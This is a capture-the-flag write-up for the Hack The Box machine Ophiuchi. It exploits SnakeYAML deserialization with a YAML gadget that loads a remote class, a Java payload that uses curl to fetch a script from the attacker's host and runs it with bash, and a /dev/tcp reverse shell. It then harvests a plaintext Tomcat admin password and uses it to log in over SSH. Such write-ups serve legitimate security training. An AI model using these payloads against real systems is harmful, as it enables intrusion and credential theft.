# Enumeration-
![[Pasted image 20210620160113.png]]

### Just simply looking for an exploit on google we came up with this post -
### [Snake_Yaml_Deserialization](https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858)
### Following the post -
# Exploitation-

### 1. Trying to ping our local machine-

```bash
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker-ip/"]
  ]]
]
```

![[Pasted image 20210620161449.png]]

### 2. Netcat-
We got connection back-
```bash
root@napster:~/Documents/HTB/Ophiuchi# nc -nvlp 80
listening on [any] 80 ...
connect to [10.10.14.20] from (UNKNOWN) [10.10.10.227] 54908
HEAD /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1
User-Agent: Java/11.0.8
Host: 10.10.14.20
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: keep-alive
```

### 3. Payload-

### Downloadthe [payload](https://github.com/artsploit/yaml-payload) 
### Edit the java file to  get a reverse shell-
### `nano src/artsploit/AwesomeScriptEngineFactory.java` 
```
public AwesomeScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec("curl 10.10.14.20/shell.sh -o /tmp/shell.sh");
            Runtime.getRuntime().exec("bash /tmp/shell.sh");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
```

### Create reverse shell file shell.sh-
```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.20/9001 0>&1'
```

### Compile to get jar file-
```bash
root@napster:~/Documents/HTB/Ophiuchi/yaml-payload# javac src/artsploit/AwesomeScriptEngineFactory.java
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
root@napster:~/Documents/HTB/Ophiuchi/yaml-payload# jar -cvf yaml-payload.jar -C src/ .
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
added manifest
ignoring entry META-INF/
adding: META-INF/services/(in = 0) (out= 0)(stored 0%)
adding: META-INF/services/javax.script.ScriptEngineFactory(in = 36) (out= 38)(deflated -5%)
adding: artsploit/(in = 0) (out= 0)(stored 0%)
adding: artsploit/AwesomeScriptEngineFactory.java(in = 1563) (out= 410)(deflated 73%)
adding: artsploit/AwesomeScriptEngineFactory.class(in = 1666) (out= 697)(deflated 58%)
root@napster:~/Documents/HTB/Ophiuchi/yaml-payload# ls
README.md  src  yaml-payload.jar
```

### Start your python server and execute the jar file from the webpage-

![[Pasted image 20210620181530.png]]

# Reverse Shell-

![[Pasted image 20210620181846.png]]

```bash
tomcat@ophiuchi:~/conf$ pwd
pwd
/opt/tomcat/conf
tomcat@ophiuchi:~/conf$ ls -la
ls -la
total 240
drwxr-x--- 2 root tomcat   4096 Dec 28 00:37 .
drwxr-xr-x 9 root tomcat   4096 Oct 11  2020 ..
-rw-r----- 1 root tomcat  12873 Sep 10  2020 catalina.policy
-rw-r----- 1 root tomcat   7262 Sep 10  2020 catalina.properties
-rw-r----- 1 root tomcat   1400 Sep 10  2020 context.xml
-rw-r----- 1 root tomcat   1149 Sep 10  2020 jaspic-providers.xml
-rw-r----- 1 root tomcat   2313 Sep 10  2020 jaspic-providers.xsd
-rw-r----- 1 root tomcat   4144 Sep 10  2020 logging.properties
-rw-r----- 1 root tomcat   7588 Sep 10  2020 server.xml
-rw-r----- 1 root tomcat   2234 Dec 28 00:37 tomcat-users.xml
-rw-r----- 1 root tomcat   2558 Sep 10  2020 tomcat-users.xsd
-rw-r----- 1 root tomcat 172359 Sep 10  2020 web.xml
tomcat@ophiuchi:~/conf$ cat tomcat-users.xml | grep pass
cat tomcat-users.xml | grep pass
<user username="admin" password="whythereisalimit" roles="manager-gui,admin-gui"/>
  you must define such a user - the username and password are arbitrary. It is
  them. You will also need to set the passwords to something appropriate.
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
```

### Username-admin
### Password-whythereisalimit

# Login via SSH & User.txt-

```bash
root@napster:~/Documents/HTB/Ophiuchi/yaml-payload# ssh admin@10.10.10.227
The authenticity of host '10.10.10.227 (10.10.10.227)' can't be established.
ECDSA key fingerprint is SHA256:OmZ+JsRqDVNaBWMshp7wogZM0KhSKkp1YmaILhRxSY0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.227' (ECDSA) to the list of known hosts.
admin@10.10.10.227's password: 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-51-generic x86_64)
<SNIP>
admin@ophiuchi:~$ ls -la
total 36
drwxr-xr-x 5 admin admin 4096 Jun 20 19:50 .
drwxr-xr-x 3 root  root  4096 Dec 28 00:18 ..
lrwxrwxrwx 1 root  root     9 Dec 28 00:51 .bash_history -> /dev/null
-rw-r--r-- 1 admin admin  220 Dec 28 00:18 .bash_logout
-rw-r--r-- 1 admin admin 3771 Dec 28 00:18 .bashrc
drwx------ 2 admin admin 4096 Dec 28 00:35 .cache
drwx------ 4 admin admin 4096 Jan  6 08:31 .gnupg
drwxrwxr-x 3 admin admin 4096 Jun 20 19:50 .local
-rw-r--r-- 1 admin admin  807 Dec 28 00:18 .profile
-rw-r--r-- 1 admin admin    0 Jan  7 09:18 .sudo_as_admin_successful
-r-------- 1 admin admin   33 Jun 20 19:46 user.txt
lrwxrwxrwx 1 root  root     9 Jan  7 09:11 .viminfo -> /dev/null
admin@ophiuchi:~$ cat user.txt 
505a54792a1e0ff3d62409926d045299
```